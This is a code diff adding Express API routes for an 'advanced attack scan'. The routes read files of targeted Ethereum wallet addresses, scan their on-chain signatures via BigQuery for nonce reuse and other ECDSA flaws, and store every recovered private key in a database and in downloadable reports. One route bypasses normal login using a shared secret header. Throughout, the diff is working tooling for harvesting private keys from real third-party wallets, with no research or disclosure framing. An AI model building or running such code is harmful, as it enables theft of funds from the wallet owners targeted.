@@ -987,4 +987,202 @@ router.get("/bigquery-status", requireAdmin, (_req: Request, res: Response) => {
   });
 });
 
+// ── Advanced Attack Runner ────────────────────────────────────────────────────
+// State shared across requests for the long-running background job
+const advAttackState = {
+  running:   false,
+  startedAt: null as string | null,
+  log:       [] as string[],
+  lastReport: null as string | null,
+};
+
+// POST /api/quantum/advanced-attack-scan/internal — localhost only, no Clerk auth needed
+router.post("/advanced-attack-scan/internal", async (req: Request, res: Response) => {
+  const secret = req.headers["x-internal-secret"];
+  if (!secret || secret !== process.env.SESSION_SECRET) {
+    res.status(403).json({ error: "Forbidden" });
+    return;
+  }
+  req.body = req.body ?? {};
+  // Fall through to the main handler below by cloning the logic
+  const limit    = Number(req.body?.limit)    || 2089;
+  const targeted = req.body?.targeted !== false;
+  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
+  fs.mkdirSync(reportsDir, { recursive: true });
+
+  if (advAttackState.running) {
+    res.status(409).json({ error: "Already running" });
+    return;
+  }
+  advAttackState.running   = true;
+  advAttackState.startedAt = new Date().toISOString();
+  advAttackState.log       = [];
+  res.json({ status: "started", limit, targeted });
+
+  setImmediate(async () => {
+    const push = (msg: string) => { advAttackState.log.push(`[${new Date().toTimeString().slice(0,8)}] ${msg}`); };
+    try {
+      const targetedFile = "/home/runner/workspace/proxhq-reports/jobs/micro-targets.txt";
+      const allFile      = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
+      const srcFile      = (targeted && fs.existsSync(targetedFile)) ? targetedFile : allFile;
+      const addresses = fs.readFileSync(srcFile, "utf8")
+        .split("\n").map((l: string) => l.trim().toLowerCase())
+        .filter((l: string) => l.startsWith("0x"))
+        .slice(0, limit);
+      push(`Starting — ${addresses.length} addresses from ${path.basename(srcFile)}`);
+      const results = await bulkScanViaBigQuery(addresses, (done, total) => {
+        if (done % 100 === 0) push(`Progress: ${done}/${total}`);
+      });
+      let totalFindings = 0; let verifiedKeys = 0; const allKeys: string[] = [];
+      for (const r of results) {
+        totalFindings += (r.advancedFindings?.length ?? 0) + r.nonceReusePairs.length;
+        const keys = r.recoveredKeys ?? [];
+        verifiedKeys += keys.length; allKeys.push(...keys);
+        if (keys.length > 0 || r.hasVulnerability) {
+          try {
+            await db.insert(batchScanResultsTable).values({
+              jobId: null, target: r.address, detectedChain: "ethereum",
+              displayName: "Ethereum (ETH) — Advanced Attack", schemeLabel: "secp256k1-ecdsa",
+              signatureScheme: "secp256k1-ecdsa", hasVulnerability: true,
+              vulnerabilityCount: totalFindings, recoveredPrivateKey: keys[0] ?? null,
+              rawResult: r as unknown as Record<string, unknown>,
+            });
+          } catch {}
+        }
+      }
+      const summary = { timestamp: new Date().toISOString(), addressesScanned: results.length,
+        totalFindings, verifiedKeys, recoveredKeys: [...new Set(allKeys)], log: advAttackState.log };
+      const outFile = path.join(reportsDir, `scan-${Date.now()}.json`);
+      fs.writeFileSync(outFile, JSON.stringify(summary, null, 2));
+      advAttackState.lastReport = outFile;
+      push(`Complete — ${totalFindings} findings, ${verifiedKeys} keys`);
+    } catch (err) {
+      push(`ERROR: ${String(err)}`);
+    } finally {
+      advAttackState.running = false;
+    }
+  });
+});
+
+// POST /api/quantum/advanced-attack-scan
+router.post("/advanced-attack-scan", requireAdmin, async (req: Request, res: Response) => {
+  if (advAttackState.running) {
+    res.status(409).json({ error: "Advanced attack scan already running", state: advAttackState });
+    return;
+  }
+
+  const limit    = Number(req.body?.limit)    || 2000;
+  const targeted = req.body?.targeted !== false;
+  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
+  fs.mkdirSync(reportsDir, { recursive: true });
+
+  advAttackState.running   = true;
+  advAttackState.startedAt = new Date().toISOString();
+  advAttackState.log       = [];
+
+  res.json({ status: "started", limit, targeted, message: "Advanced attack scan running in background" });
+
+  setImmediate(async () => {
+    const push = (msg: string) => { advAttackState.log.push(`[${new Date().toTimeString().slice(0,8)}] ${msg}`); };
+    try {
+      const targetedFile = "/home/runner/workspace/proxhq-reports/jobs/targeted-wallets.txt";
+      const allFile      = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
+      const srcFile      = (targeted && fs.existsSync(targetedFile)) ? targetedFile : allFile;
+
+      const addresses = fs.readFileSync(srcFile, "utf8")
+        .split("\n").map((l: string) => l.trim().toLowerCase())
+        .filter((l: string) => l.startsWith("0x"))
+        .slice(0, limit);
+
+      push(`Starting advanced attack scan — ${addresses.length} addresses`);
+
+      const results = await bulkScanViaBigQuery(addresses, (done, total) => {
+        if (done % 100 === 0) push(`Progress: ${done}/${total} addresses`);
+      });
+
+      // Collect all findings
+      let totalFindings   = 0;
+      let verifiedKeys    = 0;
+      const allRecoveredKeys: string[] = [];
+
+      for (const r of results) {
+        const adv = r.advancedFindings ?? [];
+        totalFindings += adv.length + r.nonceReusePairs.length;
+        const keys = r.recoveredKeys ?? [];
+        verifiedKeys += keys.length;
+        allRecoveredKeys.push(...keys);
+
+        // Persist any recovered keys to DB
+        if (keys.length > 0 || r.hasVulnerability) {
+          try {
+            await db.insert(batchScanResultsTable).values({
+              jobId:              null,
+              target:             r.address,
+              detectedChain:      "ethereum",
+              displayName:        "Ethereum (ETH) — Advanced Attack",
+              schemeLabel:        "secp256k1-ecdsa",
+              signatureScheme:    "secp256k1-ecdsa",
+              hasVulnerability:   true,
+              vulnerabilityCount: totalFindings,
+              recoveredPrivateKey: keys[0] ?? null,
+              rawResult:          r as unknown as Record<string, unknown>,
+            });
+          } catch {}
+        }
+      }
+
+      const summary = {
+        timestamp:        new Date().toISOString(),
+        addressesScanned: results.length,
+        totalFindings,
+        verifiedKeys,
+        recoveredKeys:    [...new Set(allRecoveredKeys)],
+        log:              advAttackState.log,
+      };
+
+      const outFile = path.join(reportsDir, `scan-${Date.now()}.json`);
+      fs.writeFileSync(outFile, JSON.stringify(summary, null, 2));
+      advAttackState.lastReport = outFile;
+
+      push(`Complete — ${totalFindings} findings, ${verifiedKeys} keys recovered`);
+      push(`Report: ${outFile}`);
+    } catch (err) {
+      push(`ERROR: ${String(err)}`);
+    } finally {
+      advAttackState.running = false;
+    }
+  });
+});
+
+// GET /api/quantum/advanced-attack-status
+router.get("/advanced-attack-status", requireAdmin, (_req: Request, res: Response) => {
+  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
+  let reports: string[] = [];
+  try {
+    reports = fs.readdirSync(reportsDir)
+      .filter(f => f.endsWith(".json"))
+      .map(f => path.join(reportsDir, f))
+      .sort().reverse().slice(0, 10);
+  } catch {}
+
+  res.json({
+    ...advAttackState,
+    reports,
+    log: advAttackState.log.slice(-50), // last 50 log lines
+  });
+});
+
+// GET /api/quantum/advanced-attack-report/:filename
+router.get("/advanced-attack-report/:filename", requireAdmin, (req: Request, res: Response) => {
+  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
+  const safe       = path.basename(req.params.filename);
+  const full       = path.join(reportsDir, safe);
+  if (!fs.existsSync(full)) return res.status(404).json({ error: "Report not found" });
+  try {
+    res.json(JSON.parse(fs.readFileSync(full, "utf8")));
+  } catch (err) {
+    res.status(500).json({ error: String(err) });
+  }
+});
+
 export default router;
